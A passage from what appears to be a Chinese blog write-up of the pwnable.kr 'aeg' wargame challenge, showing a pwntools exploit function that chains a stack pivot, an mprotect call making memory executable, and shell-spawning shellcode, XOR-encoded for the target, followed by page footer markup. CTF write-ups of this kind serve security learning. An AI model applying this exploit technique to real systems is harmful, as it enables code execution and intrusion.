function_">exp_craft</span>(<span class="params">path: <span class="built_in">str</span>, padding: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    exe = ELF(path)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += padding</span><br><span class="line">    payload += cyclic(bin_info[<span class="string">&#x27;padding&#x27;</span>])</span><br><span class="line">    payload += p64(</span><br><span class="line">        bin_info[<span class="string">&#x27;buffer_addr&#x27;</span>]</span><br><span class="line">        + <span class="number">80</span></span><br><span class="line">        + bin_info[<span class="string">&#x27;rdx_gadget_offset&#x27;</span>]</span><br><span class="line">        + bin_info[<span class="string">&#x27;padding&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    payload += p64(bin_info[<span class="string">&#x27;rdx_gadget_addr&#x27;</span>])</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x10000</span>)</span><br><span class="line">    <span class="comment"># len -&gt; rsi: 0x10000</span></span><br><span class="line">    payload += p64(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># prot -&gt; rdx: PROT_READ | PROT_WRITE | PROT_EXEC</span></span><br><span class="line">    payload += p64(bin_info[<span class="string">&#x27;buffer_addr&#x27;</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000</span>)</span><br><span class="line">    <span class="comment"># addr -&gt; rdi: buffer address</span></span><br><span class="line">    payload += cyclic(bin_info[<span class="string">&#x27;rdx_gadget_offset&#x27;</span>] - <span class="number">8</span>)</span><br><span class="line">    payload += p64(exe.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">    payload += p64(</span><br><span class="line">        bin_info[<span class="string">&#x27;buffer_addr&#x27;</span>]</span><br><span class="line">        + <span class="number">104</span></span><br><span class="line">        + bin_info[<span class="string">&#x27;rdx_gadget_offset&#x27;</span>]</span><br><span class="line">        + bin_info[<span class="string">&#x27;padding&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    payload += asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">    payload = xor(bin_info[<span class="string">&#x27;xors&#x27;</span>], payload)</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>
+
+<p>我参考了很多<a target="_blank" rel="noopener" href="https://github.com/wangray/pwnable_kr/blob/master/aeg/aeg.py">wangray</a>的题解，但是偏移量和实际利用时是有些差异的，好在栈迁移的调试过程还算顺利。</p>
+<p>终于结束了恶心的aeg。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/03/29/new-life/" rel="prev" title="new life">
+                  <i class="fa fa-angle-left"></i> new life
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">zeredy879</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/zeredy879" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
